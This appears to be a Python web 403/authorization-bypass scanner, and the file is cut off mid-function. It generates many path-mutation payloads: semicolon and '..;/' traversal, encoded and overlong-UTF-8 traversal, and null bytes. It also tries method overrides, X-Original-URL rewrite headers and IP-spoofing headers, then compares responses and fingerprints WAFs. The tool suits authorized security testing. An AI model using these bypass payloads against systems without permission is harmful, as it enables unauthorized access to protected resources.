#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import argparse
import asyncio
import csv
import difflib
import hashlib
import html as html_lib
import json
import os
import random
import re
import statistics
import sys
import time
import unicodedata
from urllib.parse import urlparse, urljoin

try:
    import aiohttp
    from aiohttp import ClientTimeout
except ImportError:
    print("[-] 缺少依赖，请先执行: pip install aiohttp")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None


# ---------------------------------------------------------------------------
# 常量与正则
# ---------------------------------------------------------------------------
VERSION = "3.2"
OK_CODES = {200, 201, 202, 204}
REDIRECT_CODES = {301, 302, 303, 307, 308}
DENY_CODES = {401, 403}
DENY_LIKE = DENY_CODES | {405}
NO_BODY_METHODS = {"HEAD", "OPTIONS", "TRACE"}
AUTH_SIM_THRESHOLD = 0.85
MAX_BODY_SIZE = 512 * 1024  # 512KB，流式读取上限
MAX_DIFF_CHARS = 20 * 1024  # HTML diff 视图单边字符上限（防大卡）

LOGIN_HINT = re.compile(r"(?i)login|signin|sign-in|/auth|sso|cas\b")
DENY_HINT = re.compile(
    r"(?i)access denied|forbidden|unauthorized|permission denied|not allowed|"
    r"无权限|没有权限|权限不足|拒绝访问|请先登录|尚未登录|未登录|登录已过期|重新登录")

DYN_PATTERNS = [
    (re.compile(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(\.\d+)?"), "<DATETIME>"),
    (re.compile(r"\d{10,13}"), "<TIMESTAMP>"),
    (re.compile(r"(?i)((?:csrf|token|nonce|ticket|jsessionid|session)[\w-]*[\"']?\s*[:=]\s*[\"'])[^\"'&<>\s]+"), r"\1<VALUE>"),
    (re.compile(r"[0-9a-fA-F]{32,}"), "<HEX>"),
    (re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"), "<UUID>"),
]

TAG_RE = re.compile(r"(?is)<(script|style)[^>]*>.*?</\1>|<[^>]+>")
WS_RE = re.compile(r"\s+")

STATIC_PREFIXES = ("static", "public", "assets", "res", "js", "css", "images", "i")
STATIC_SUFFIXES = (".html", ".do", ".action", ".jsp", ".json", ".css", ".js", ".png")
IP_SPOOF_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Client-IP",
                    "X-Remote-IP", "X-Remote-Addr", "Client-IP")

# v3.1 [D6 修复] WAF 指纹分三级，消除正文泛化关键字误伤：
#   头部强指纹：命中 Server / WAF 专用响应头即判定
WAF_HEADER_SIGNATURES = [
    (re.compile(r"(?i)cloudflare|cf-ray|__cf_bm"), "Cloudflare"),
    (re.compile(r"(?i)akamai|akamaighost"), "Akamai"),
    (re.compile(r"(?i)sucuri"), "Sucuri"),
    (re.compile(r"(?i)f5.{0,10}bigip|bigipserver"), "F5 BIG-IP"),
    (re.compile(r"(?i)mod_?security"), "ModSecurity"),
    (re.compile(r"(?i)aliyun[-_]?waf|waf-cg|x-acw-"), "阿里云WAF"),
    (re.compile(r"(?i)tencent[-_ ]?waf|tsec[-_]?waf|stgw"), "腾讯云WAF"),
    (re.compile(r"(?i)safedog|safe3"), "安全狗"),
    (re.compile(r"(?i)yunsuo"), "云锁"),
    (re.compile(r"(?i)baidu[-_]?waf|yunjiasu"), "百度云防护"),
]
#   正文强指纹：多字无歧义特征，单独命中即判定
WAF_BODY_STRONG = [
    (re.compile(r"请求被拦截|阻断了您的访问|非法请求已被|已被.{0,10}安全.{0,10}拦截|web应用防火墙"), "通用WAF"),
    (re.compile(r"(?i)access denied by|blocked by.{0,20}(waf|firewall|security)|security rule (violation|triggered)"), "安全防护"),
    (re.compile(r"(?i)mod_?security.{0,20}rules?"), "ModSecurity"),
    (re.compile(r"(?i)incident id|support id.{0,10}[0-9a-f-]{8,}"), "WAF事件页"),
]
#   正文弱指纹：较短/较泛化，必须有拦截类状态码佐证才判定
WAF_BODY_WEAK = [
    (re.compile(r"安全拦截|访问被拦截|请求异常.{0,10}拦截"), "安全拦截"),
    (re.compile(r"(?i)request blocked|malicious request|attack detected"), "安全防护"),
]
WAF_CORROBORATE_CODES = {403, 406, 418, 429, 501, 503}
# 参与头部指纹匹配的响应头（Server 之外常见的 WAF 标识头）
WAF_HEADER_KEYS = ("server", "x-cdn", "x-waf", "x-sucuri-id", "cf-ray",
                   "x-acw-sc__v2", "x-acw-sc__v3", "x-backside-transport")

# 类别字母映射（用于 --categories 筛选）
CATEGORY_MAP = {
    "A": "分号参数", "B": "..;/ 穿越", "C": "目录穿越",
    "D": "借道前缀", "E": "大小写", "F": "斜杠",
    "G": "后缀匹配", "H": "特殊编码", "I": "HTTP方法",
    "J": "转发头", "K": "来源伪造", "L": "路径结构",
    "M": "缓存欺骗", "N": "DotNet", "O": "NodeJs", "P": "Nginx",
    # v3.2 新增类别
    "Q": "路径规范化", "R": "编码解码", "S": "尾缀差异",
    "T": "重定向差异", "U": "请求头重写",
}


# ---------------------------------------------------------------------------
# 0. 工具函数
# ---------------------------------------------------------------------------
def pad(s, width):
    """按东亚字符宽度对齐"""
    w = sum(2 if unicodedata.east_asian_width(ch) in "WF" else 1 for ch in s)
    return s + " " * max(0, width - w)


def mask_cookie(cookie):
    """报告中的 Cookie 脱敏：每个键值只保留前 4 位"""
    if not cookie:
        return ""
    return re.sub(r"=([^;\s]{4})[^;\s]*", r"=\1***", cookie)


def sha16(s):
    """响应体短哈希"""
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16] if s else ""


def esc(s):
    """HTML 转义"""
    return html_lib.escape(str(s)) if s else ""


def split_path(url):
    p = urlparse(url)
    segs = [s for s in p.path.split("/") if s != ""]
    return f"{p.scheme}://{p.netloc}", segs, p.query


def pct_encode_char(ch, double=False):
    """v3.1 [D4 修复] 按 UTF-8 字节进行百分号编码；double=True 时做双重编码。
    旧实现按 Unicode 码点编码（f"%{ord(ch):02x}"），非 ASCII 字符（ord>255）
    会产出 %4e2d 这类非法序列，且 URL 编码本就应是字节级。"""
    return "".join((f"%25{b:02x}" if double else f"%{b:02x}") for b in ch.encode("utf-8"))


def pct_encode(s, double=False):
    """v3.2: 整串按 UTF-8 字节百分号编码（double=True 双重编码）"""
    return "".join(pct_encode_char(ch, double) for ch in s)


def downgrade_conf(conf):
    """v3.1 [D5 修复] 置信度降一档"""
    return {"高": "中", "中": "低"}.get(conf, conf)


# ---------------------------------------------------------------------------
# 1. 异步限速器
# ---------------------------------------------------------------------------
class AsyncRateLimiter:
    """异步全局限速器：间隔 >= base*factor 秒 + 随机抖动；
    429 时 factor 翻倍（上限 16x）；v3.1 新增 reward()——成功后 factor 渐进回落，
    并支持 base=0 快速路径（不进锁）。"""

    def __init__(self, interval, jitter=0.3):
        self.base = max(0.0, interval)
        self.jitter = max(0.0, min(1.0, jitter))
        self._factor = 1.0
        self._lock = asyncio.Lock()
        self._last = 0.0

    async def wait(self):
        if self.base <= 0:
            return  # v3.1: 无间隔要求时不进锁，避免高并发下锁成为瓶颈
        async with self._lock:
            interval = self.base * self._factor
            if interval and self.jitter:
                interval += random.uniform(0, interval * self.jitter)
            now = time.monotonic()
            gap = now - self._last
            if gap < interval:
                await asyncio.sleep(interval - gap)
            self._last = time.monotonic()

    async def penalize(self):
        async with self._lock:
            self._factor = min(self._factor * 2, 16.0)

    async def reward(self):
        """v3.1: 请求成功后 factor 渐进回落（每次 *0.75，下限 1.0）"""
        if self._factor <= 1.0:
            return
        async with self._lock:
            self._factor = max(1.0, self._factor * 0.75)


# ---------------------------------------------------------------------------
# 2. 响应指纹与内容感知相似度（JSON 值类型感知）
# ---------------------------------------------------------------------------
def fingerprint(body):
    """稳定性检查用指纹：归一化动态字段 + title 提权"""
    if not body:
        return ""
    text = body[:12000]
    for pat, rep in DYN_PATTERNS:
        text = pat.sub(rep, text)
    m = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
    title = m.group(1).strip() if m else ""
    return (title + "\n" + text)[:4000]


def similarity(a, b):
    """基于 markup 指纹的相似度——仅用于基线稳定性检查"""
    fa, fb = fingerprint(a), fingerprint(b)
    if not fa and not fb:
        return 1.0
    if not fa or not fb:
        return 0.0
    return difflib.SequenceMatcher(None, fa, fb).ratio()


def visible_text(body):
    """去 script/style/标签，只保留正文文本"""
    return WS_RE.sub(" ", TAG_RE.sub(" ", body or "")).strip()


def json_key_paths(body):
    """JSON 响应提取 key 路径集合（列表下标归一化为 []），非 JSON 返回 None"""
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    keys = set()

    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                p = f"{path}.{k}" if path else str(k)
                keys.add(p)
                walk(v, p)
        elif isinstance(o, list):
            for item in o[:20]:
                walk(item, path + "[]")

    walk(data, "")
    return keys


def json_value_profile(body):
    """提取 JSON 值的类型画像——每个 key 路径 → 值类型 + 量级"""
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    profile = {}

    def classify(val):
        if val is None:
            return "null"
        if isinstance(val, bool):
            return "bool"
        if isinstance(val, (int, float)):
            if val == 0:
                return "num:0"
            magnitude = len(str(int(abs(val))))
            return f"num:{magnitude}"
        if isinstance(val, str):
            length = len(val)
            if length == 0:
                return "str:0"
            if length < 10:
                return "str:s"
            if length < 100:
                return "str:m"
            return "str:l"
        if isinstance(val, list):
            return f"list:{len(val)}"
        if isinstance(val, dict):
            return f"dict:{len(val)}"
        return "unknown"

    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                p = f"{path}.{k}" if path else str(k)
                profile[p] = classify(v)
                walk(v, p)
        elif isinstance(o, list):
            for item in o[:20]:
                walk(item, path + "[]")

    walk(data, "")
    return profile


def json_value_similarity(body_a, body_b):
    """JSON 值类型感知相似度——key 路径 Jaccard (60%) + 值类型匹配 (40%)
    比纯 key 路径 Jaccard 更精确：能区分 {"data":[1,2,3]} 与 {"data":[]}"""
    pa, pb = json_value_profile(body_a), json_value_profile(body_b)
    if pa is None or pb is None:
        return None
    if not pa and not pb:
        return 1.0
    keys_a, keys_b = set(pa.keys()), set(pb.keys())
    union = keys_a | keys_b
    if not union:
        return 1.0
    key_sim = len(keys_a & keys_b) / len(union)
    common = keys_a & keys_b
    if common:
        type_match = sum(1 for k in common if pa[k] == pb[k]) / len(common)
    else:
        type_match = 0.0
    return 0.6 * key_sim + 0.4 * type_match


def _ratio(a, b, cutoff=0.0):
    """带 real_quick_ratio 预筛的 difflib 比值"""
    sm = difflib.SequenceMatcher(None, a, b)
    if cutoff > 0 and sm.real_quick_ratio() < cutoff:
        return 0.0
    return sm.ratio()


def content_similarity(body_a, ctype_a, body_b, ctype_b, cutoff=0.0):
    """内容感知相似度。
    - 双方都是 JSON：优先使用值类型感知相似度（比纯 key Jaccard 更精确）
    - 否则：去标签取正文 + 动态字段归一化后做 difflib
    """
    if not body_a and not body_b:
        return 1.0
    if not body_a or not body_b:
        return 0.0
    if "json" in (ctype_a or "").lower() and "json" in (ctype_b or "").lower():
        val_sim = json_value_similarity(body_a, body_b)
        if val_sim is not None:
            return val_sim
    ta, tb = visible_text(body_a)[:4000], visible_text(body_b)[:4000]
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    for pat, rep in DYN_PATTERNS:
        ta = pat.sub(rep, ta)
        tb = pat.sub(rep, tb)
    return _ratio(ta, tb, cutoff)


def is_login_redirect(location):
    return bool(location) and bool(LOGIN_HINT.search(location))


# ---------------------------------------------------------------------------
# 3. WAF / CDN 检测 + 响应头分析 + RTT 异常
# ---------------------------------------------------------------------------
def detect_waf(resp):
    """v3.1 [D6 修复] 检测响应是否为 WAF 拦截页面。
    三级指纹策略：
      1) 头部强指纹（Server / WAF 专用头）——命中即判定；
      2) 正文强指纹（多字无歧义特征）——命中即判定；
      3) 正文弱指纹——必须伴随拦截类状态码（403/406/418/429/501/503）佐证。
    修复了旧版正文中出现 "blocked"/"拦截"/"tencent" 等泛化词即误判的问题。
    """
    code = resp.get("code", 0)
    headers = resp.get("headers", {})
    header_blob = " ".join(
        [resp.get("server", "")]
        + [f"{k}:{v}" for k, v in headers.items() if k.lower() in WAF_HEADER_KEYS]
    )
    for pat, name in WAF_HEADER_SIGNATURES:
        if pat.search(header_blob):
            return name

    body_text = visible_text(resp.get("body", ""))[:2000]
    for pat, name in WAF_BODY_STRONG:
        if pat.search(body_text):
            return name

    if code in WAF_CORROBORATE_CODES:
        for pat, name in WAF_BODY_WEAK:
            if pat.search(body_text):
                return name
    return None


def is_cached(resp):
    """检测响应是否来自 CDN 缓存"""
    cache_status = resp.get("cache_status", "").upper()
    age = resp.get("age", "")
    if cache_status in ("HIT", "HIT-FROM-CACHE"):
        return True
    if cache_status == "DYNAMIC":
        return False  # Cloudflare DYNAMIC = 未缓存
    if age and age != "0":
        return True
    return False


def header_signals(resp, base_low):
    """分析响应头中的鉴权信号，返回信号列表（v3.1 移除未使用的 base_high 死参数）"""
    signals = []
    resp_h = {k.lower(): v for k, v in resp.get("headers", {}).items()}
    base_h = {k.lower(): v for k, v in base_low.get("headers", {}).items()}

    # Set-Cookie 变化：变形响应设置了新的会话 Cookie → 可能触发了登录流程
    if "set-cookie" in resp_h and "set-cookie" not in base_h:
        signals.append("响应设置新Cookie")
    # WWW-Authenticate
    if "www-authenticate" in resp_h:
        signals.append("响应含WWW-Authenticate头")
    # X-Powered-By 变化（可能命中不同后端）
    resp_powered = resp_h.get("x-powered-by", "")
    base_powered = base_h.get("x-powered-by", "")
    if resp_powered and base_powered and resp_powered != base_powered:
        signals.append(f"X-Powered-By变化: {base_powered}→{resp_powered}")
    # Content-Type 变化
    resp_ct = resp_h.get("content-type", "")
    base_ct = base_h.get("content-type", "")
    if resp_ct and base_ct and resp_ct != base_ct:
        signals.append(f"Content-Type变化: {base_ct}→{resp_ct}")

    return signals


def rtt_anomaly(resp_rtt, base_rtt_list):
    """v3.1 [D2 修复] 检测响应时间异常。
    - >=3 样本：均值 ± 3σ；
    - 2 样本：稳健极差法——响应超过基线最大值 3 倍且绝对差 > 0.5s 才告警。
    旧版要求 >=3 样本，而基线自适应采样通常 2 次即稳定返回，导致该功能永不触发。
    """
    if not base_rtt_list or len(base_rtt_list) < 2:
        return None
    if len(base_rtt_list) >= 3:
        try:
            mean = statistics.mean(base_rtt_list)
            stdev = statistics.stdev(base_rtt_list)
        except statistics.StatisticsError:
            return None
        if stdev > 0 and abs(resp_rtt - mean) > 3 * stdev:
            return f"RTT异常: {resp_rtt:.3f}s vs 基线均值{mean:.3f}s"
        return None
    hi = max(base_rtt_list)
    if resp_rtt > hi * 3 and resp_rtt - hi > 0.5:
        return f"RTT异常: {resp_rtt:.3f}s vs 基线最大{hi:.3f}s"
    return None


# ---------------------------------------------------------------------------
# 4. 变形生成器插件化架构
# ---------------------------------------------------------------------------
class VariantPlugin:
    """变形生成插件基类"""
    category = ""

    def generate(self, ctx):
        """Override in subclass. ctx 包含 prefix/segs/query/orig_path/first/rest/tail_rest/qo"""
        raise NotImplementedError

    @staticmethod
    def _build(cat, desc, raw, ctx, method="GET", headers=None, keep_query=True, body=None, follow=False):
        prefix = ctx["prefix"]
        query = ctx["query"]
        full = raw if raw.startswith("http") else prefix + raw + (("?" + query) if (query and keep_query) else "")
        # v3.2: follow=True 标记该变形命中重定向时需做跳转链追踪（见 RedirectProbePlugin）
        return {"cat": cat, "desc": desc, "url": full, "method": method,
                "headers": headers or {}, "body": body, "follow": follow}


class SemicolonPlugin(VariantPlugin):
    category = "分号参数"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail = c["orig_path"], c["first"], c["rest"], c["tail_rest"]
        segs = c["segs"]
        V = self._build
        return [
            V("分号参数", "首段后插 ;foo=bar", f"/{first};foo=bar" + tail if rest else op + ";foo=bar", c),
            V("分号参数", "首段后插 ;jsessionid", f"/{first};jsessionid=AAAA" + tail if rest else op + ";jsessionid=AAAA", c),
            V("分号参数", "末段追加 ;jsessionid", op + ";jsessionid=AAAA", c),
            V("分号参数", "末段追加 ;a=1", op + ";a=1", c),
            V("分号参数", "中间段插 ;a=1", "/" + "/".join(s + ";a=1" for s in segs), c),
            V("分号参数", "尾部单独分号 ;", op + ";", c),
            V("分号参数", "编码分号 %3b", op + "%3ba=1", c),
            V("分号参数", "大写编码分号 %3B", op + "%3Ba=1", c),
            V("分号参数", "双重编码分号 %253b", op + "%253ba=1", c),
            V("分号参数", "/;/ 前缀形式", "/;/" + "/".join(segs), c),
            V("分号参数", "/.;/ 点分号前缀", "/.;/" + "/".join(segs), c),
            V("分号参数", "/%3b/ 编码分号前缀", "/%3b/" + "/".join(segs), c),
            V("分号参数", "首段编码分号 %3bjsessionid",
              f"/{first}%3bjsessionid=AAAA" + tail if rest else op + "%3bjsessionid=AAAA", c),
            # v3.2 [需求3] 矩阵参数扩展：安全层裁剪分号后内容 vs 路由层保留原文的差异面
            V("分号参数", "路径前导矩阵参数 ;a=1/", ";a=1/" + "/".join(segs), c),
            V("分号参数", "每段前置 ;a=1", "/" + "/".join(";a=1" + s for s in segs), c),
            V("分号参数", "首段大写+矩阵参数", "/" + first.upper() + ";a=1" + tail, c),
            V("分号参数", "尾斜杠后分号 /;", op + "/;", c),
            V("分号参数", "全编码矩阵参数 %3ba%3d1", op + "%3ba%3d1", c),
            V("分号参数", "矩阵参数内含路径分隔 ;/x=/", op + ";/x=/", c),
            V("分号参数", "首段矩阵参数+尾随斜杠", f"/{first};a=1/" + (rest or ""), c),
            V("分号参数", "分号+空段包裹 /;/…;/", "/;/" + "/".join(segs) + ";/", c),
        ]


class TraversalPlugin(VariantPlugin):
    category = "..;/ 穿越"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        V = self._build
        return [
            V("..;/ 穿越", "/x/..;/ + 原路径", "/x/..;" + op, c),
            V("..;/ 穿越", "首段后 ..;/", f"/{first}/..;/" + rest if rest else "/x/..;" + op, c),
            V("..;/ 穿越", "..; 编码形式 /%2e%2e;/", "/x/%2e%2e;" + op, c),
            V("..;/ 穿越", "..;/..;/ 双重组合", "/x/..;/..;" + op, c),
            V("..;/ 穿越", "..;/..;/..;/ 三重组合", "/x/..;/..;/..;" + op, c),
            V("..;/ 穿越", "..; 反斜杠组合", "/x/..;\\..;" + op, c),
            V("..;/ 穿越", "末段 ..;/ 穿越", op + "/..;/", c),
        ]


class DirectoryTraversalPlugin(VariantPlugin):
    category = "目录穿越"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        sj = "/".join(segs)
        V = self._build
        return [
            V("目录穿越", "字面 /x/../", "/x/.." + op, c),
            V("目录穿越", "%2e%2e", "/x/%2e%2e" + op, c),
            V("目录穿越", "大写 %2E%2E", "/x/%2E%2E" + op, c),
            V("目录穿越", "..%2f", "/x/..%2f" + sj, c),
            V("目录穿越", "%2e%2e%2f", "/x/%2e%2e%2f" + sj, c),
            V("目录穿越", "%2e%2e%5c 编码反斜杠", "/x/%2e%2e%5c" + sj, c),
            V("目录穿越", "双重编码 %252e%252e", "/x/%252e%252e" + op, c),
            V("目录穿越", "混合 ..%252f", "/x/..%252f" + sj, c),
            V("目录穿越", "双写 ....// 绕过滤器", "/x/....//" + sj, c),
            V("目录穿越", "超长UTF-8 %c0%ae%c0%ae", "/x/%c0%ae%c0%ae%c0%af" + sj, c),
            V("目录穿越", "UTF-8 overlong %c0%2f", "/x/%c0%ae%c0%2f" + sj, c),
            V("目录穿越", "UTF-8 overlong %e0%80%af", "/x/%e0%80%ae%e0%80%af" + sj, c),
            V("目录穿越", "UTF-8 overlong %f0%80%80%af", "/x/%f0%80%80%ae%f0%80%80%af" + sj, c),
            # v3.1 [D4 修复] 双重编码全路径：按 UTF-8 字节编码，非 ASCII 不再产出非法序列
            V("目录穿越", "双重编码全路径", "/" + "".join(pct_encode_char(s, double=True) for s in op[1:]), c),
        ]


class StaticPrefixPlugin(VariantPlugin):
    category = "借道前缀"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for p in STATIC_PREFIXES:
            variants.append(V("借道前缀", f"/{p}/../ 回退", f"/{p}/.." + op, c))
        for p in STATIC_PREFIXES[:3]:
            variants.append(V("借道前缀", f"/{p}/..;/ 回退", f"/{p}/..;" + op, c))
        return variants


class CasePlugin(VariantPlugin):
    category = "大小写"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        mixed = "".join(ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(first))
        variants = [
            V("大小写", "首段全大写", "/" + first.upper() + tail, c),
            V("大小写", "首段首字母大写", "/" + first.capitalize() + tail, c),
            V("大小写", "首段交替大小写", "/" + mixed + tail, c),
            V("大小写", "全路径大写", op.upper(), c),
        ]
        if rest:
            variants.append(V("大小写", "末段全大写", "/" + "/".join(segs[:-1]) + "/" + segs[-1].upper(), c))
        return variants


class SlashPlugin(VariantPlugin):
    category = "斜杠"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        return [
            V("斜杠", "尾斜杠", op + "/", c),
            V("斜杠", "尾部双斜杠", op + "//", c),
            V("斜杠", "双斜杠开头", "/" + op, c),
            V("斜杠", "三斜杠开头", "//" + op, c),
            V("斜杠", "中间双斜杠", f"/{first}//{rest}" if rest else op + "//", c),
            V("斜杠", "/./ 当前目录", f"/{first}/./" + rest if rest else "/./" + first, c),
            V("斜杠", "编码点目录 /%2e/", "/%2e/" + "/".join(segs), c),
            V("斜杠", "编码斜杠 %2f 结尾", op + "%2f", c),
            V("斜杠", "全反斜杠路径 %5c", "/" + "%5c".join(segs), c),
        ]


class SuffixPlugin(VariantPlugin):
    category = "后缀匹配"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for suf in STATIC_SUFFIXES:
            variants.append(V("后缀匹配", f"追加 {suf}", op + suf, c))
        variants.append(V("后缀匹配", "尾部点号", op + ".", c))
        variants.append(V("后缀匹配", "尾部 /. 后缀", op + "/.", c))
        return variants


class SpecialEncodingPlugin(VariantPlugin):
    category = "特殊编码"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        variants = []
        if first:
            # v3.1 [D4 修复] 首字母编码改按 UTF-8 字节，支持非 ASCII 路径
            enc = pct_encode_char(first[0]) + first[1:]
            variants.append(V("特殊编码", "首字母 URL 编码", "/" + enc + tail, c))
            dbl = pct_encode_char(first[0], double=True) + first[1:]
            variants.append(V("特殊编码", "首字母双重编码", "/" + dbl + tail, c))
            variants.append(V("特殊编码", "首段前导 %09 制表符", "/%09" + "/".join(segs), c))
        variants.append(V("特殊编码", "路径尾部 %00 截断尝试", op + "%00", c))
        if rest:
            variants.append(V("特殊编码", "路径中间 %00", f"/{first}%00" + tail, c))
            variants.append(V("特殊编码", "路径中间 %3f 编码问号", f"/{first}%3f" + tail, c))
        variants.append(V("特殊编码", "路径尾部 %20 空格", op + "%20", c))
        variants.append(V("特殊编码", "路径尾部 %09 制表符", op + "%09", c))
        variants.append(V("特殊编码", "首个 / 替换为 %5c", "/" + op[1:].replace("/", "%5c", 1), c))
        variants.append(V("特殊编码", "路径尾部 %0a 换行", op + "%0a", c))
        variants.append(V("特殊编码", "路径尾部 %0d 回车", op + "%0d", c))
        variants.append(V("特殊编码", "路径尾部 %0d%0a 组合", op + "%0d%0a", c))
        variants.append(V("特殊编码", "尾部 %23 编码井号", op + "%23", c))
        variants.append(V("特殊编码", "原始反斜杠路径", "/" + "\\".join(segs), c))
        return variants


class HttpMethodPlugin(VariantPlugin):
    category = "HTTP方法"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for m in ("POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"):
            variants.append(V("HTTP方法", f"改用 {m}", op, c, method=m))
        variants.append(V("HTTP方法", "自定义方法 FOO", op, c, method="FOO"))
        variants.append(V("HTTP方法", "POST + X-HTTP-Method-Override: GET", op, c,
                          method="POST", headers={"X-HTTP-Method-Override": "GET"}))
        variants.append(V("HTTP方法", "POST + X-Original-Method: GET", op, c,
                          method="POST", headers={"X-Original-Method": "GET"}))
        variants.append(V("HTTP方法", "POST + X-HTTP-Method: GET", op, c,
                          method="POST", headers={"X-HTTP-Method": "GET"}))
        variants.append(V("HTTP方法", "POST + X-Method-Override: GET", op, c,
                          method="POST", headers={"X-Method-Override": "GET"}))
        variants.append(V("HTTP方法", "POST + HTTP-Method-Override: GET", op, c,
                          method="POST", headers={"HTTP-Method-Override": "GET"}))
        variants.append(V("HTTP方法", "POST + body _method=GET", op, c,
                          method="POST",
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          body="_method=GET"))
        variants.append(V("HTTP方法", "POST + body _method=DELETE", op, c,
                          method="POST",
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          body="_method=DELETE"))
        # v3.2 [需求5] 方法级鉴权一致性扩展
        variants.append(V("HTTP方法", "PROPFIND (WebDAV)", op, c, method="PROPFIND"))
        variants.append(V("HTTP方法", "CONNECT 方法", op, c, method="CONNECT"))
        variants.append(V("HTTP方法", "GET + X-HTTP-Method-Override: DELETE", op, c,
                          method="GET", headers={"X-HTTP-Method-Override": "DELETE"}))
        variants.append(V("HTTP方法", "GET + X-HTTP-Method-Override: PUT", op, c,
                          method="GET", headers={"X-HTTP-Method-Override": "PUT"}))
        return variants


class ForwardHeaderPlugin(VariantPlugin):
    category = "转发头"

    def generate(self, ctx):
        c = ctx
        op, qo = c["orig_path"], c["qo"]
        V = self._build
        return [
            V("转发头", "X-Original-URL", "/", c, headers={"X-Original-URL": op + qo}, keep_query=False),
            V("转发头", "X-Rewrite-URL", "/", c, headers={"X-Rewrite-URL": op + qo}, keep_query=False),
            V("转发头", "X-Forwarded-Uri", "/", c, headers={"X-Forwarded-Uri": op + qo}, keep_query=False),
            V("转发头", "X-Original-URI", "/", c, headers={"X-Original-URI": op + qo}, keep_query=False),
            V("转发头", "X-Original-URL 双层变形", "/", c,
              headers={"X-Original-URL": op + ";jsessionid=AAAA" + qo}, keep_query=False),
            V("转发头", "X-Forwarded-Prefix", op, c, headers={"X-Forwarded-Prefix": "/internal"}),
            V("转发头", "X-Forwarded-Host: localhost", op, c, headers={"X-Forwarded-Host": "localhost"}),
            V("转发头", "X-Forwarded-Proto: https", op, c, headers={"X-Forwarded-Proto": "https"}),
        ]


class SourceSpoofPlugin(VariantPlugin):
    category = "来源伪造"

    def generate(self, ctx):
        c = ctx
        op, prefix = c["orig_path"], c["prefix"]
        V = self._build
        variants = []
        for h in IP_SPOOF_HEADERS:
            variants.append(V("来源伪造", f"{h}: 127.0.0.1", op, c, headers={h: "127.0.0.1"}))
        variants.append(V("来源伪造", "X-Forwarded-For 内网地址", op, c, headers={"X-Forwarded-For": "10.0.0.1"}))
        variants.append(V("来源伪造", "Referer 伪造站内来源", op, c, headers={"Referer": prefix + op}))
        return variants


class PathStructurePlugin(VariantPlugin):
    category = "路径结构"

    def generate(self, ctx):
        c = ctx
        op, first, rest, segs = c["orig_path"], c["first"], c["rest"], c["segs"]
        V = self._build
        variants = []
        if rest:
            variants.append(V("路径结构", "访问父路径（/** 规则不覆盖本级）", "/" + "/".join(segs[:-1]), c))
            variants.append(V("路径结构", "首段重复双写", f"/{first}/{first}/" + rest, c))
        return variants


class CacheDeceptionPlugin(VariantPlugin):
    category = "缓存欺骗"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        return [
            V("缓存欺骗", "追加伪静态资源 /x.css", op + "/x.css", c),
            V("缓存欺骗", "尾部 %0a.css", op + "%0a.css", c),
        ]


class DotNetPlugin(VariantPlugin):
    """IIS / .NET 路径解析差异变形"""
    category = "DotNet"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        V = self._build
        return [
            V("DotNet", "%5c 全反斜杠路径", "/" + "%5c".join(segs), c),
            V("DotNet", "/~/ 波浪号前缀(IIS短文件名)", "/~" + op, c),
            V("DotNet", "::$DATA NTFS数据流", op + "::$DATA", c),
            V("DotNet", "尾部 /.$DATA", op + "/.$DATA", c),
        ]


class NodeJsPlugin(VariantPlugin):
    """Node.js (Express) 路由差异变形"""
    category = "NodeJs"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        V = self._build
        variants = [
            V("NodeJs", "大写+尾斜杠", op.upper() + "/", c),
            # v3.1 [D4 修复] 全路径URL编码改按 UTF-8 字节
            V("NodeJs", "全路径URL编码", "/" + "".join(pct_encode_char(ch) for ch in op[1:]), c),
        ]
        if c["query"]:
            variants.append(V("NodeJs", "HTTP参数污染 ?id=1&id=2", op + "?" + c["query"] + "&id=2", c))
        else:
            variants.append(V("NodeJs", "HTTP参数污染 ?id=1&id=2", op + "?id=1&id=2", c))
        return variants


class NginxPlugin(VariantPlugin):
    """Nginx 配置差异变形"""
    category = "Nginx"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        return [
            V("Nginx", "%00.jpg 截断+alias", op + "%00.jpg", c),
            V("Nginx", "/proxy_pass 前缀", "/proxy" + op, c),
            V("Nginx", "// 双斜杠前缀(proxy_pass差异)", "//" + op.lstrip("/"), c),
        ]


class PathNormalizationPlugin(VariantPlugin):
    """v3.2 [需求1] 路径规范化差异：发现服务器/代理/框架/鉴权模块
    对路径标准化顺序不一致（security rule 看的 URI 与 actual routing 解析结果不同）"""
    category = "路径规范化"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
